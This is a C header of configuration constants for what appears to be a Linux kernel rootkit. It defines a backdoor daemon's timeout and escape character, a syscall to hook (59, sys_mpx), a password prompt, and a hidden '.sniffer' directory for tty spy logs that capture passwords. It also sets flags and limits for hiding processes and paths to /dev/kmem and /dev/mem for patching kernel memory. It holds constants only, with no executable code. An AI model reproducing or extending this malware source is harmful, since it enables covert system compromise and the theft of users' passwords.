/*
 * $Id: setup.h, various configurable defs
 */

#ifndef SETUP_H
#define SETUP_H

/* this is timeout for daemon to shutdown connection */
#define	BDTIMEOUT	600

/* escape character -- '~' */
#define	ECHAR		'~'

/* what syscall to hook for aux */
#define	SYSAUX		59	/* sys_mpx */
#define	__NR_skaux	SYSAUX
#define	__NR_SYSAUX	SYSAUX

/* password prompt */
#define	SKPROMPT	"Password: "

/* directory settings */
#define PWDHACK	".pwdhack"
#define	SNIFFER		".sniffer"/* ~/.sniffer - to store tty spy logs */

#define	NETSTRUCT	0x7fc
#define SNIFFSTRUCT	0x7f8

#define SN_STATE_PASSWD		0x80000000

#define FLAG_BITS	2
#define	FLAG_HIDDEN	1
#define	FLAG_NET	2
#define	FLAG_SNIFFING	4
#define	PF_NET		0x04000000
#define	PF_SNIFFING	0x08000000
#define SNIFFLIMIT	8192

#define	DEFAULT_KMEM	"/dev/./kmem"
#define	DEFAULT_MEM	"/dev/./mem"

#define	KERNEL_MAGIC 0x1deadbee

/* maximum pid number; could be 32768, but just for sure */
#define	MAXPID		32768
#define	MAXHIDDEN	1024

#endif
